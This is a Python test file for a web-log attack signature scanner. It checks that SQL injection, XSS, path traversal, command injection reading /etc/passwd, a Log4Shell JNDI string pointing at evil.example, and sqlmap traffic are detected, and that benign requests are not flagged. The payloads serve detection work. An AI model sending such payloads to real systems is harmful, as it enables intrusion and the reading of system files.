from tb_collector.signatures import scan_line


def kinds(line):
    return {k for _, k, _, _ in scan_line(line)}


def test_sql_injection_or():
    assert "web_sqli" in kinds("/?id=1' OR 1=1-- ")


def test_sql_injection_union():
    assert "web_sqli" in kinds("/?q=1 UNION SELECT password FROM users")


def test_xss():
    assert "web_xss" in kinds("/?q=<script>alert(1)</script>")


def test_path_traversal():
    assert "web_traversal" in kinds("/download?file=../../etc/passwd")


def test_command_injection():
    assert "web_cmdi" in kinds("/?cmd=;cat /etc/passwd")


def test_log4shell():
    assert "web_log4shell" in kinds("GET / HTTP/1.1 header ${jndi:ldap://evil.example/x}")


def test_scanner_user_agent():
    line = '1.2.3.4 - - [t] "GET / HTTP/1.1" 200 1 "-" "sqlmap/1.7#stable"'
    assert "scanner_tool" in kinds(line)


def test_benign_id_param_no_false_positive():
    line = '1.2.3.4 - - [t] "GET /?id=5&cat=food HTTP/1.1" 200 1 "-" "Mozilla/5.0"'
    assert kinds(line) == set()


def test_benign_page_no_hits():
    assert scan_line('1.2.3.4 - - [t] "GET /index.html HTTP/1.1" 200 100 "-" "Mozilla/5.0"') == []


def test_auth_line_no_web_hits():
    assert scan_line("Failed password for root from 1.2.3.4 port 22 ssh2") == []
